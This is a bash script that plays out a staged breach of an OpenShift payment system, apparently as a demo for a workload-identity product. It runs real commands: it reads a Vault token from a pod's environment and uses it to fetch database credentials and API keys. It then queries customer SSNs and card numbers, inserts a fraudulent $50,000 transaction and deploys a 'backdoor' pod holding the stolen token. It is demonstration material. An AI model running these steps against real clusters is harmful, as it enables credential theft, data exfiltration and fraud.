#!/bin/bash
# Interactive Realistic Attack Demo
# Looks like a real terminal session

set -e

# Simple function to show command and wait
run_cmd() {
    local cmd="$1"
    echo "\$ $cmd"
    read -s  # Silent read, just wait for Enter
    eval "$cmd"
    echo ""
}

# Function for commentary (minimal)
comment() {
    echo "# $1"
    echo ""
}

clear

cat << 'EOF'
================================================================================
                    PRODUCTION DATABASE BREACH DEMO
                     Live Attack on OpenShift Cluster
================================================================================

EOF

echo "Scenario: Financial services company using Kubernetes and Vault"
echo "Target: Production payment processing system"
echo ""
read -p "Press Enter to begin reconnaissance..."
echo ""
echo ""

# PHASE 1: RECONNAISSANCE
comment "Reconnaissance: What's running in production?"

run_cmd "oc get pods -n production"

run_cmd "oc get deployment payment-processor -n production"

echo ""
comment "Target identified: payment-processor deployment"
echo ""
read -s

# PHASE 2: INITIAL COMPROMISE
echo ""
comment "Attacker exploits RCE vulnerability, gains shell access to pod"
echo ""

POD=$(oc get pod -n production -l app=payment-processor -o jsonpath='{.items[0].metadata.name}')

run_cmd "export POD=$POD"

run_cmd "echo \"Compromised pod: \$POD\""

echo ""
comment "First thing attacker does: search for credentials in environment"
echo ""

run_cmd "oc exec -n production \$POD -- printenv | grep -i vault"

echo ""
comment "CREDENTIAL THEFT: Static Vault token found in environment variable"
comment "Token is valid for 90 days and works from anywhere"
echo ""
read -s

# PHASE 3: VAULT ACCESS
echo ""
comment "Attacker uses stolen token to access Vault (from their own infrastructure)"
echo ""

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/database/production | jq .data.data'"

echo ""
comment "DATABASE CREDENTIALS STOLEN: Full access to production database"
echo ""
read -s

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'"

echo ""
comment "API KEYS COMPROMISED: Stripe, AWS, SendGrid - complete system access"
echo ""
read -s

# PHASE 4: DATABASE ACCESS - THE BREACH
echo ""
comment "Attacker connects to production database using stolen credentials"
echo ""

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c '\\dt'"

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT COUNT(*) as total_customers FROM customers;'"

echo ""
comment "Exfiltrating customer PII - Top 5 accounts by balance"
echo ""

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;'"

echo ""
comment "CRITICAL DATA BREACH: Real customer data exposed"
echo ""
read -s

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -t -c 'SELECT SUM(account_balance) as total_at_risk FROM customers;' | xargs echo 'Total money at risk: \$'"

echo ""
comment "Over \$1.2 MILLION in customer accounts exposed"
echo ""
read -s

# PHASE 5: DATA MANIPULATION
echo ""
comment "Attacker has WRITE access - creating fraudulent transaction"
echo ""

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"INSERT INTO transactions (customer_id, amount, transaction_type, description) VALUES (1, -50000.00, 'withdrawal', 'UNAUTHORIZED - Attacker controlled transfer') RETURNING *;\""

echo ""
comment "FRAUDULENT TRANSACTION CREATED: \$50,000 unauthorized withdrawal"
comment "This is no longer just data theft - this is FINANCIAL FRAUD"
echo ""
read -s

run_cmd "oc exec -n production \$POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c 'SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;'"

echo ""
read -s

# PHASE 6: PERSISTENCE
echo ""
comment "Deploying backdoor pod for persistent access"
echo ""

VAULT_TOKEN=$(oc exec -n production $POD -- printenv VAULT_TOKEN)

cat <<EOFYAML > /tmp/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-exfil
  namespace: production
  labels:
    app: monitoring
spec:
  containers:
  - name: exfil
    image: registry.access.redhat.com/ubi9/ubi-minimal:latest
    command: ["/bin/bash", "-c"]
    args:
    - |
      echo "Backdoor active - continuous data exfiltration"
      while true; do
        echo "[\$(date)] Exfiltrating to attacker C2..."
        sleep 300
      done
    env:
    - name: STOLEN_VAULT_TOKEN
      value: "$VAULT_TOKEN"
    - name: DB_HOST
      value: customer-database.production.svc.cluster.local
EOFYAML

run_cmd "oc apply -f /tmp/backdoor.yaml"

run_cmd "oc get pod backdoor-exfil -n production"

echo ""
comment "BACKDOOR DEPLOYED: Attacker maintains access even after patching"
echo ""
read -s

# FINAL SUMMARY
echo ""
echo "================================================================================"
echo "                           ATTACK COMPLETE"
echo "================================================================================"
echo ""
echo "WHAT JUST HAPPENED:"
echo ""
echo "  ✓ Reconnaissance - identified payment processor"
echo "  ✓ RCE exploitation - gained shell access"
echo "  ✓ Credential theft - stole 90-day Vault token from environment"
echo "  ✓ Vault access - retrieved database credentials and API keys"
echo "  ✓ Data exfiltration - 10 customers, \$1.2M+ in accounts"
echo "  ✓ Fraudulent transaction - \$50,000 unauthorized withdrawal"
echo "  ✓ Persistence - deployed backdoor pod"
echo ""
echo "BUSINESS IMPACT:"
echo ""
echo "  • Financial Loss: Potential \$1.2M+ in fraud"
echo "  • Compliance Violations: GDPR, PCI-DSS, SOX"
echo "  • Reputation Damage: Customer trust destroyed"
echo "  • Legal Liability: Class action lawsuits"
echo "  • Operational Impact: Complete system rebuild required"
echo ""
echo "ATTACKER CAPABILITIES:"
echo ""
echo "  • Access valid for: 90 DAYS (2,160 hours)"
echo "  • Can operate from: Anywhere in the world"
echo "  • Detection difficulty: High (looks like legitimate app traffic)"
echo "  • Persistence mechanism: Backdoor pod with stolen credentials"
echo ""
echo "WHY DID THIS SUCCEED?"
echo ""
echo "  1. Static, long-lived Vault token (90-day TTL)"
echo "  2. Token stored in environment variable (easily discoverable)"
echo "  3. No workload identity verification"
echo "  4. Token usable from ANY location (no attestation)"
echo "  5. Single credential = access to entire secret store"
echo "  6. No automatic rotation or expiration"
echo ""
echo "================================================================================"
echo ""
echo "This is a realistic attack based on actual production breaches."
echo ""
echo "Next: See how ZTWIM prevents this ENTIRE attack chain..."
echo ""
